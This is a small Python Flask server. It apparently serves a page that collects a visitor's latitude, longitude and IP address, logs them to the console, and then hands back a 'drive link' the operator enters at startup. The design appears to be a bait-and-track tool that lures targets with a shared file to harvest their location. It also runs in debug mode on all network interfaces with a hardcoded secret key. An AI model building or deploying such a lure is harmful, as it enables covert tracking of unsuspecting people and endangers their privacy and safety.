from flask import Flask, request, render_template, redirect
import json
app = Flask(__name__)
app.config["SECRET_KEY"]="key"
drive_link=""
@app.route("/")
def index():
    return render_template("index.html")
@app.route("/locate", methods = ["POST"])
def locate():
    data = json.loads(request.data)
    print("location cordinates:")
    print(f"lattitude: {data['lat']}")
    print(f"longitude: {data['lon']}")
    print(f"ip address: {request.remote_addr}")
    return {"url":drive_link}
if __name__ == "__main__":
    drive_link = input("enter the drive link: ")
    app.run(debug=True, host = '0.0.0.0')
